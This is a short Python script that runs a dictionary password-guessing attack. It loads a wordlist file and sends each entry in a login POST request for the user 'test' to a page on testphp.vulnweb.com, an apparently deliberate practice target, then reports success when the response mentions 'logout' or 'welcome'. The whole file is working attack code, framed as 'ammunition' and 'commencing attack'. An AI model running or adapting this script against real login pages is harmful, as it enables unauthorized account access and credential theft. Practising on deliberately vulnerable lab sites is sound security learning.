import requests

target_url = "http://testphp.vulnweb.com/userinfo.php"
target_username = "test"

# 1. Point the script to your new text file
wordlist_file = "passwords.txt" 

print(f"[*] Loading ammunition from {wordlist_file}...")

# 2. Open the file, strip out the invisible "Enter" keys, and save to a list
with open(wordlist_file, "r") as file:
    passwords_to_test = [line.strip() for line in file]

print(f"[*] Loaded {len(passwords_to_test)} passwords. Commencing attack...\n")

# 3. Loop through the passwords we just pulled from the file
for password in passwords_to_test:
    print(f"[*] Trying Username: {target_username} | Password: {password}")
    
    # Bundle the payload
    login_data = {
        "uname": target_username,
        "pass": password
    }
    
    # Fire the POST request
    response = requests.post(target_url, data=login_data)
    
    # Look for the Success Indicator
    if "logout" in response.text.lower() or "welcome" in response.text.lower():
        print(f"\n[+] BINGO! SUCCESS! The password is: {password}")
        break  # We got in, stop the script!
    else:
        print("[-] FAILED.")
        
    